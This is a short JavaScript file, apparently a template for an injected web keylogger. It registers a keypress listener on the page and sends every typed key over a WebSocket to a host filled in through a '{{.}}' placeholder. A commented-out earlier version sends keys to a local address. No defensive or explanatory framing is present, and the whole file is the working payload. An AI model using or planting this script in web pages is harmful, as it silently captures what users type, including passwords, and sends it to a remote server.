// (function() {
//     // var conn = new WebSocket("ws://{{.}}/ws");
//     var conn = new WebSocket("ws://127.0.0.1:8080/ws"); 
//     document.onkeypress = keypress;
//     function keypress(evt) {
//     s = String.fromCharCode(evt.which);
//     conn.send(s);
//     }
// })();


(function() {
    var conn = new WebSocket("ws://{{.}}/ws"); 

    conn.onopen = function() {
        console.log("WebSocket connection established");
    }

    conn.onerror = function(error) {
        console.error("WebSocket error: ", error);
    }

    document.addEventListener("keypress", function(evt) {
        // var s = String.fromCharCode(evt.which);
        var s = evt.key;
        conn.send(s);
    });
})();
